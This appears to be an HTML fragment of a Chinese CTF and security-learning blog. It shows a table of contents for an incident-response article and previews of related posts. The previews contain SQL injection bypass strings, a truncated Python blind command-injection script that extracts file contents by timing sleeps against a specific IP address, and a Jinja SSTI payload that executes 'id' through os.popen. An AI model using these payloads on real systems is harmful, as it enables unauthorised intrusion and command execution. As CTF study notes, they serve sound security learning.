class="info-2"><div class="info-item-1">123456789101112万能密码： or 1 = 1#  And 1 = 1 能查到 And 1 = 2 不能查到，有sql注入url编码：&quot;=%22   &#x27;=%27  空格=%20  &amp;=%26数字型：不需要加引号，1 or 1 = 1#  就能查询字符型：需加引号联合查询：union字符型 数字型 搜索型 xx型 json注入json注入：注入json语句 json=&#123;&quot;or and 1 = 1&quot;&#125;判断字符型还是数字型sql注入：	and 1=1 和 and 1=2 来判断1 数字型：1正常 2不正常2 字符型：两个都正常  万能密码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&#x27; or 1=&#x27;1&#x27;or&#x27;=&#x27;or&#x27;adminadmin&#x27;--admin&#x27; or ...</div></div></div></a><a class="pagination-related" href="/2025/12/11/WEB/web%E8%84%9A%E6%9C%AC/" title="web脚本"><img class="cover" src="/img/backgrounds/bg-16.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-11</div><div class="info-item-2">web脚本</div></div><div class="info-2"><div class="info-item-1">WEB无参rce使用sleep(2)进行测试 1234567891011121314151617import requestsimport timeobtain = &#x27;abcdefghijklmnopqrstuvwxyz1234567890&#123;&#125;-_,.&#x27;result=&quot;&quot;for i in range(1,100):    for n in obtain:        payload = f&quot;sleep $(cat /f* | cut -c &#123;i&#125; | tr &#123;n&#125; 2.5)&quot;        url=&quot;http://47.105.113.86:40005/&quot;        data=&#123;&quot;cmd&quot;:payload&#125;        start = int(time.time())        res=requests.post(url=url,data=data)        end = int(tim...</div></div></div></a><a class="pagination-related" href="/2026/03/20/WEB/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="ssti模板注入"><img class="cover" src="/img/backgrounds/bg-14.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-20</div><div class="info-item-2">ssti模板注入</div></div><div class="info-2"><div class="info-item-1">fengjin用法1python -m fenjing webui  通用payload1&#123;&#123;request|attr(&#x27;application&#x27;)|attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;id&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;  1user_input=&#123;&#123;request|attr(&#x27;application&#x27;)|attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)|attr...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xuan23</div><div class="author-info-description">一路走来踩过不少坑，也在钻研技术的过程中收获良多。我把这里当作学习阵地，既用来梳理笔记、复盘实战，也希望分享所学，结识志同道合的朋友。未来会继续深耕方向，持续更新内容，期待和大家一起交流进步。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的技术博客。<br>记录CTF、漏洞分析、工控安全与逆向工程学习过程。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows"><span class="toc-number">1.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">文件排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%8E%92%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">进程排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%8E%92%E6%9F%A5"><span class="toc-number">1.3.</span> <span class="toc-text">系统信息排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%8E%92%E6%9F%A5"><span class="toc-number">1.4.</span> <span class="toc-text">工具排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%8E%92%E6%9F%A5"><span class="toc-number">1.5.</span> <span class="toc-text">日志排查</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%80%90%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB%E3%80%91Windows-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">2.</span> <span class="toc-text">【命令汇总】Windows 应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">2.1.</span> <span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E3%80%81%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">0x01、入侵排查过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%9B%B8%E5%85%B3"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.1 系统账户相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E8%BF%9B%E7%A8%8B%E3%80%81%E7%AB%AF%E5%8F%A3%E7%9B%B8%E5%85%B3"><span class="toc-number">2.2.2.</span> <span class="toc-text">1.2 进程、端口相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E5%90%AF%E5%8A%A8%E9%A1%B9%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E3%80%81%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.3.</span> <span class="toc-text">1.3 启动项、计划任务、服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3"><span class="toc-number">2.2.4.</span> <span class="toc-text">1.5 内存相关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E3%80%81Windows-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">0x02、Windows 日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%97%A5%E5%BF%97%E7%9B%AE%E5%BD%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.1 日志目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%B8%B8%E8%A7%81%E4%BA%8B%E4%BB%B6-ID"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.2 常见事件 ID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-Log-Parser"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3 日志分析工具 - Log Parser</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E3%80%81%E5%BF%AB%E6%8D%B7%E6%8C%87%E4%BB%A4"><span class="toc-number">2.4.</span> <span class="toc-text">0x03、快捷指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3"><span class="toc-number">2.4.1.</span> <span class="toc-text">系统相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8"><span class="toc-number">2.4.2.</span> <span class="toc-text">程序快速启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A3%81%E7%9B%98%E7%9B%B8%E5%85%B3"><span class="toc-number">2.4.3.</span> <span class="toc-text">磁盘相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%9B%B8%E5%85%B3"><span class="toc-number">2.4.4.</span> <span class="toc-text">检查相关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.5.</span> <span class="toc-text">0x04、常用的命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#net-%E7%9B%B8%E5%85%B3"><span class="toc-number">2.5.1.</span> <span class="toc-text">net 相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%98%BE%E7%A4%BA%E7%9B%B8%E5%85%B3"><span class="toc-number">2.5.2.</span> <span class="toc-text">系统显示相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">2.5.3.</span> <span class="toc-text">网络信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7"><span class="toc-number">2.5.4.</span> <span class="toc-text">一些工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.6.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%80%90%E6%B1%87%E6%80%BB%E3%80%91Windows-linux-%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95-%E8%B7%AF%E5%BE%84%E6%B1%87%E6%80%BB"><span class="toc-number">3.</span> <span class="toc-text">【汇总】Windows linux 敏感目录 路径汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E3%80%81-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.</span> <span class="toc-text">0x01、 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E3%80%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.</span> <span class="toc-text">0x02、配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.1.</span> <span class="toc-text">查找文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">3.2.2.</span> <span class="toc-text">常见的配置文件名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache"><span class="toc-number">3.2.3.</span> <span class="toc-text">Apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS"><span class="toc-number">3.2.4.</span> <span class="toc-text">IIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL"><span class="toc-number">3.2.5.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin"><span class="toc-number">3.2.6.</span> <span class="toc-text">phpMyAdmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XAMPP-%E5%BB%BA%E7%AB%99"><span class="toc-number">3.2.7.</span> <span class="toc-text">XAMPP 建站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpStudy-%E5%BB%BA%E7%AB%99"><span class="toc-number">3.2.8.</span> <span class="toc-text">phpStudy 建站</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E3%80%81%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.</span> <span class="toc-text">0x03、敏感文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E9%92%88%E7%AD%89%E4%BF%A1%E6%81%AF"><span class="toc-number">3.3.1.</span> <span class="toc-text">探针等信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">3.3.2.</span> <span class="toc-text">Windows</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux"><span class="toc-number">4.</span> <span class="toc-text">linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-1"><span class="toc-number">4.1.</span> <span class="toc-text">linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E3%80%81%E5%B8%B8%E8%A7%81-CMS"><span class="toc-number">4.2.</span> <span class="toc-text">0x04、常见 CMS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DeDeCms"><span class="toc-number">4.2.1.</span> <span class="toc-text">DeDeCms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress"><span class="toc-number">4.2.2.</span> <span class="toc-text">WordPress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecshop"><span class="toc-number">4.2.3.</span> <span class="toc-text">Ecshop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP168"><span class="toc-number">4.2.4.</span> <span class="toc-text">PHP168</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMSeasy"><span class="toc-number">4.2.5.</span> <span class="toc-text">CMSeasy</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux-2"><span class="toc-number">5.</span> <span class="toc-text">linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5-1"><span class="toc-number">5.1.</span> <span class="toc-text">文件排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%8E%92%E6%9F%A5-1"><span class="toc-number">5.2.</span> <span class="toc-text">进程排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%8E%92%E6%9F%A5-1"><span class="toc-number">5.3.</span> <span class="toc-text">系统信息排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5"><span class="toc-number">5.4.</span> <span class="toc-text">后门排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%8E%92%E6%9F%A5-1"><span class="toc-number">5.5.</span> <span class="toc-text">日志排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86"><span class="toc-number">5.5.1.</span> <span class="toc-text">基于时间的日志管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86"><span class="toc-number">5.5.2.</span> <span class="toc-text">系统日志管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97"><span class="toc-number">5.5.3.</span> <span class="toc-text">中间件日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%97%A5%E5%BF%97"><span class="toc-number">5.5.4.</span> <span class="toc-text">数据库日志</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/03/22/WEB/php/" title="php"><img src="/img/backgrounds/bg-12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php"/></a><div class="content"><a class="title" href="/2026/03/22/WEB/php/" title="php">php</a><time datetime="2026-03-22T03:14:48.000Z" title="发表于 2026-03-22 11:14:48">2026-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="应急响应"><img src="/img/backgrounds/bg-20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应"/></a><div class="content"><a class="title" href="/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="应急响应">应急响应</a><time datetime="2026-03-22T00:39:45.000Z" title="发表于 2026-03-22 08:39:45">2026-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/22/WEB/%E4%BF%AE%E5%A4%8D/" title="修复"><img src="/img/backgrounds/bg-19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修复"/></a><div class="content"><a class="title" href="/2026/03/22/WEB/%E4%BF%AE%E5%A4%8D/" title="修复">修复</a><time datetime="2026-03-22T00:38:10.000Z" title="发表于 2026-03-22 08:38:10">2026-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/21/%E5%BA%94%E6%80%A5%E6%80%BB%E7%BB%93/%E4%BF%AE%E5%A4%8D/" title="修复"><img src="/img/backgrounds/bg-10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修复"/></a><div class="content"><a class="title" href="/2026/03/21/%E5%BA%94%E6%80%A5%E6%80%BB%E7%BB%93/%E4%BF%AE%E5%A4%8D/" title="修复">修复</a><time datetime="2026-03-21T15:00:08.000Z" title="发表于 2026-03-21 23:00:08">2026-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/21/awd/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEWriteUP/" title="第二届广东大学生网络安全攻防大赛决赛Web题目WriteUP"><img src="/img/backgrounds/bg-04.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第二届广东大学生网络安全攻防大赛决赛Web题目WriteUP"/></a><div class="content"><a class="title" href="/2026/03/21/awd/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEWriteUP/" title="第二届广东大学生网络安全攻防大赛决赛Web题目WriteUP">第二届广东大学生网络安全攻防大赛决赛Web题目WriteUP</a><time datetime="2026-03-21T14:58:25.000Z" title="发表于 2026-03-21 22:58:25">2026-03-21</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xuan23</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
